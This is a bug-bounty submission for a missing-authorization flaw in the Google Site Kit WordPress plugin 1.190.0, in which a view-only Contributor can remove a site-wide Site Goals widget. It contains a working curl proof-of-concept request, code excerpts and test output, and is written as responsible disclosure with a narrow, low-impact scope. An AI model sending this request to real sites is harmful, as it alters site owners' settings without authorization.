# Wordfence submission 01 — Site Goals site-wide write at Contributor+

Field-by-field for the Wordfence Bug Bounty intake form. Paste each block into
the matching field.

---

## Software

    Type              Plugin
    Name              Google Site Kit
    Slug              google-site-kit
    Affected versions 1.190.0 (current at submission). The mechanism —
                      Permission_Aware_Datapoint — arrived in 1.181.0, but the
                      datapoint that writes site-wide state through it,
                      Remove_Site_Goals_Widget, is @since 1.190.0, so that is
                      the first affected release.
    Reachability      Registered unconditionally in Analytics_4's datapoint
                      array (Analytics_4.php:1074) — no feature flag.
    Tested on         1.190.0, commit 8cf47de
    Patched version   none — unfixed in the current release

## Title

    Google Site Kit <= 1.190.0 - Missing Authorization to Authenticated
    (Contributor+) Site-Wide Settings Modification via Site Goals Datapoints

## Vulnerability type

    Missing Authorization / Broken Access Control  (CWE-862)

## Required privileges

    Authenticated, Contributor or above, on a site where Dashboard Sharing has
    been enabled for the user's role on any module. The view-only grant is
    sufficient; no management grant is needed.

## CVSS

    3.1  AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N  = 4.3 (Medium)

## Description

The Google Site Kit plugin for WordPress does not correctly authorize its Site
Goals datapoints, which makes it possible for authenticated attackers with
Contributor-level access and above, on sites where Dashboard Sharing has been
enabled for their role, to modify a site-wide plugin option.

Every write through the `modules/<slug>/data/<datapoint>` REST route required
`googlesitekit_manage_options` until version 1.181.0. That release added
`Permission_Aware_Datapoint`, which lets an individual datapoint supply its own
permission callback, and `REST_Modules_Controller::resolve_datapoint_permission()`
substitutes that callback for the route's own rather than requiring both:

```php
// includes/Core/Modules/REST_Modules_Controller.php
private function resolve_datapoint_permission( WP_REST_Request $request, callable $default_callback ) {
    …
    if ( ! $datapoint instanceof Permission_Aware_Datapoint ) {
        return $default_callback( $request );
    }
    return $datapoint->permission_callback();   // replaces the default outright
}
```

The Site Goals datapoints supply `googlesitekit_view_dashboard`:

```php
// includes/Modules/Analytics_4/Datapoints/Site_Goals_Settings_Datapoint.php:69
public function permission_callback() {
    return current_user_can( Permissions::VIEW_DASHBOARD );
}
```

`VIEW_DASHBOARD` is reachable by a shared-role user:
`Permissions::check_view_dashboard_capability()` falls back to
`check_view_shared_dashboard_capability()` for a user who is not an
authenticated Site Kit user, and that fallback asks only whether the user's
role appears in any module's `sharedRoles` and whether the shared-dashboard
splash has been dismissed.

Seven concrete datapoints reach that callback — the three Site Goals ones, the
two Reader Revenue Manager `User_Settings_Datapoint` subclasses, plus
`Get_Benchmarking_Data` and `Get_Form_Metadata` — and every one of them gates on
`current_user_can( VIEW_DASHBOARD )`. Four are reads. Two are writes to
`User_Setting` values, which is per-user and consistent with a view-only grant.
`Remove_Site_Goals_Widget` (@since 1.190.0) is the only one that writes
site-wide state:

```php
// includes/Modules/Analytics_4/Datapoints/Remove_Site_Goals_Widget.php
return function () use ( $widget ) {
    return $this->site_goals_site_settings->remove_widget( $widget );
};
```

`Site_Goals_Site_Settings extends Setting` with
`OPTION = 'googlesitekit_analytics-4_site_goals_site_settings'` — a single
value for the whole site. The widget a view-only user removes disappears from
the Site Goals section for every user of the site, not just for themselves.

The class it inherits from states the invariant it breaks. The base class's own
docblock, in the plugin's source:

```php
// includes/Modules/Analytics_4/Datapoints/Site_Goals_Settings_Datapoint.php:21
/**
 * Base class for the per-user Site Goals settings datapoints.
 *
 * @since 1.181.0
 */
abstract class Site_Goals_Settings_Datapoint extends Shareable_Datapoint implements Executable_Datapoint, Permission_Aware_Datapoint {
```

Its two siblings keep to that: `Get_Site_Goals_Settings` reads, and
`Save_Site_Goals_Settings` writes `$this->site_goals_settings`, which is
`Site_Goals_Settings( $this->user_options )` — per-user.
`Remove_Site_Goals_Widget` writes `$this->site_goals_site_settings`, which is
`Site_Goals_Site_Settings( $this->options )` — site-wide. So a
`VIEW_DASHBOARD` gate that is correct for a family documented as per-user is
inherited by the one subclass that is not per-user.

Note for triage: the plugin fixed the same pattern under **CVE-2026-10753**
(*"users with dashboard sharing permissions (such as Editors) could modify
email reporting settings restricted to administrators"*, fixed in 1.176.0).
That fix, commit `2bb4fb2878`, changes one thing on the write half of
`core/site/data/email-reporting`:

```diff
-   'permission_callback' => $can_access,    // VIEW_SPLASH || VIEW_DASHBOARD
+   'permission_callback' => $can_manage,    // MANAGE_OPTIONS
```

There is also a plugin unit test asserting the current Site Goals behaviour
(`tests/phpunit/integration/Modules/Analytics_4/Datapoints/Remove_Site_Goals_WidgetTest.php`
— `test_permission_callback__allows_a_view_only_user()`). I am raising it
rather than leaving it to be found: the CVE fix and that test take opposite
positions on whether a write may be gated on the dashboard-sharing capability,
and that is the question for the vendor.

## Proof of concept

1. Install WordPress with Google Site Kit 1.190.0. Complete Site Kit setup and
   connect Analytics-4, owned by the administrator.
2. As the administrator, go to Site Kit → Settings → Dashboard Sharing and
   share Analytics-4 with the Contributor role. Leave management set to
   "Owner" — grant nothing beyond viewing.
3. Create a Contributor account. Sign in as that Contributor and open the Site
   Kit dashboard once, so the shared-dashboard splash is dismissed.
4. Note the current site-wide value:

       googlesitekit_analytics-4_site_goals_site_settings = {"activeWidgets":["ecommerce","lead"]}

5. As that Contributor, with their own cookies and their own REST nonce:

       curl -i -X POST 'http://<site>/?rest_route=/google-site-kit/v1/modules/analytics-4/data/remove-site-goals-widget' \
            -H 'Content-Type: application/json' \
            -H 'X-WP-Nonce: <contributor nonce>' \
            -b cookies.txt \
            --data '{"data":{"widget":"ecommerce"}}'

   `ALLOWED_WIDGETS` is `array( 'ecommerce', 'lead' )`, so either value works.

6. The response is `200 OK` with `{"activeWidgets":["lead"]}`, and the
   site-wide option is now `{"activeWidgets":["lead"]}` for every user.

### Observed output

```
environment
  date (UTC)      : 2026-10-29T16:42:22Z
  WordPress       : 6.9.11
  Site Kit        : 1.190.0   (commit 8cf47de)
  PHP             : 8.3.6

logged in as the contributor 'viewonly' (role: contributor, view-only Dashboard Sharing)

state before
  googlesitekit_analytics-4_site_goals_site_settings = {"activeWidgets":["ecommerce","lead"]}

response
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=UTF-8
  Allow: GET, POST, PUT, PATCH

  {"activeWidgets":["lead"]}

state after
  googlesitekit_analytics-4_site_goals_site_settings = {"activeWidgets":["lead"]}
```

### Controls — same site, one variable changed at a time

```
A. Dashboard Sharing OFF for every module
  subscriber                                  VIEW_DASHBOARD=false -> 403 rest_forbidden   activeWidgets ["ecommerce","lead"]
  contributor (edit_posts)                    VIEW_DASHBOARD=false -> 403 rest_forbidden   activeWidgets ["ecommerce","lead"]

B. Dashboard Sharing ON: analytics-4 shared with 'contributor', view only
  subscriber                                  VIEW_DASHBOARD=false -> 403 rest_forbidden   activeWidgets ["ecommerce","lead"]
  contributor (edit_posts), view-only share   VIEW_DASHBOARD=true  -> 200                  activeWidgets ["lead"]
```

The only difference between the two 403s and the 200 is the view grant.

## Suggested remediation

A datapoint's own permission callback should narrow the route's permission,
never widen it — take the stricter of the two instead of replacing one with the
other. Failing that, `Remove_Site_Goals_Widget` writes site-wide state and
should require `Permissions::MANAGE_OPTIONS` like the rest of the editable
route, with `VIEW_DASHBOARD` kept for the three datapoints that write per-user
settings.

## Scope of the claim

Only the option change is demonstrated. No other user's data is readable
through it and nothing executes. I checked the obvious escalations and they do
not hold: a share on one module does not reach another module's datapoints
(`Module::get_oauth_client_for_datapoint()` requires `READ_SHARED_MODULE_DATA`
for that module, and without it the call ends at `missing_required_scopes`);
`core/modules/data/sharing-settings` refuses the same user with 403, so the
grant cannot be widened; and the per-user settings sanitiser drops unknown
keys. The daily cron restores a removed widget when its provider plugin is
active and Site Kit finds its events, so the change is not necessarily
permanent.

## Test environment

Local WordPress on SQLite (`sqlite-database-integration` v3.1.2), because the
machine has no MySQL. Site Kit's proxy credentials, a Search Console property
and the module owner's granted scopes and access token were written directly,
because an OAuth flow cannot be completed offline. All three sit *after* the
permission check this report concerns, and with Dashboard Sharing switched off
and everything else identical the same Contributor receives 403 — control A
above.

## Disclosure status

Not publicly disclosed. Not submitted to any other bug bounty platform. It was
filed to Google's OSS VRP on 2026-10-29 (issue 579506120) and closed on
2026-10-30 as `Won't fix (Infeasible)` — not on technical merit: Google paused
OSS VRP product-vulnerability intake on 2026-10-01 and is accepting
supply-chain reports only. The technical question was never reached there, and
the issue is not public.
